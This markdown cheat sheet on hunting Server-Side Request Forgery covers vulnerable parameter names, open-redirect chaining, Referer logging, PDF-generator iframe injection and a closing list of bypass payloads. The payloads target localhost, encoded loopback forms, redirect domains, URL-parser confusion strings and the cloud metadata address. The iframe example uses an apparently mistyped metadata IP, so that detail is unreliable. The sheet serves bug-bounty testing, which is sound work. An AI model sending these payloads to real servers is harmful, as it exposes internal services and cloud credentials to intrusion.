# SSRF (Server-Side Request Forgery)

## What is ssrf?
SSRF is when an attacker manipulates the server into making requests, which can be internal services such as local host or AWS, as well as arbitrary external systems.

## Hunting ssrf
### URL parameters
`url=`, `targetUrl=`, `requestUrl=`, `path=`

### API, webhooks
Look for developer portal, e.g. developer.example.com, example.com/developer

### Open redirects
Find open redirects and chain SSRF.
```xml
go
return
r_url
returnUrl
returnUri
locationUrl
goTo
return_url
return_uri
ref=
referrer=
backUrl
returnTo
successUrl
```
### Referer header
Simply set Referer: https://www.yourdomain.com and start logging requests via your own private collaborator server.

### PDF generators
- Can I inject HTML?
- Can I access remote servers?
- Can I execute JavaScript?
- Is the server that’s rendering my PDF cloud hosted?
- Are there any known vulnerabilities in the component that’s generating the PDF?
- What other services or systems can I interact with?

Read: [Hunting for SSRF Bugs in PDF Generators](https://www.blackhillsinfosec.com/hunting-for-ssrf-bugs-in-pdf-generators/)
#### wkhtmlpdf
WebKit rendering engine to convert HTML and CSS into PDF documents.
```xml
<iframe src="http://192.254.169.251/user-data">
```

## Payload
```xml
http://127.0.0.1:80
http://0.0.0.0:80
http://localhost:80
http://[::]:80/
http://spoofed.burpcollaborator.net
http://localtest.me
http://customer1.app.localhost.my.company.127.0.0.1.nip.io
http://mail.ebc.apple.com redirect to 127.0.0.6 == localhost
http://bugbounty.dod.network redirect to 127.0.0.2 == localhost
http://127.127.127.127
http://2130706433/ = http://127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]
localhost:+11211aaa
http://0/
http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http://169.254.169.254
0://evil.com:80;http://google.com:80
```